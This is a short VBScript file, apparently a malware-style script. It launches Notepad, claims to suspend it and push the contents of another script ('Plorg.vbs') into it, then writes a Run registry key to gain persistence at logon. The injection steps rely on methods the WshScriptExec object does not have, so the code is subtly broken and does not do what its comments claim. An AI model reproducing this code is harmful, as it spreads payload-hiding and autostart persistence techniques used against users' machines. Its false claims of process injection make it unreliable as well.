Set objWshShell = CreateObject("Wscript.Shell")
Set objWshExec = objWshShell.Exec("notepad.exe")

' Wait until Notepad is loaded in memory
Do While objWshExec.Status = 0
    WScript.Sleep 100
Loop

' Suspend the Notepad process
objWshExec.Suspend

Dim fso, folder, file, fileContents
Set fso = CreateObject("Scripting.FileSystemObject")
Set file = fso.OpenTextFile("Plorg.vbs")
fileContents = file.ReadAll
file.Close

objWshExec.StdIn.Write fileContents

' Resume the Notepad process
objWshExec.Resume

Set WshShell = WScript.CreateObject("WScript.Shell")

strKeyPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
strKeyName = "Notepad"
strKeyValue = "notepad.exe"

WshShell.RegWrite strKeyPath & "\" & strKeyName, strKeyValue, "REG_SZ"
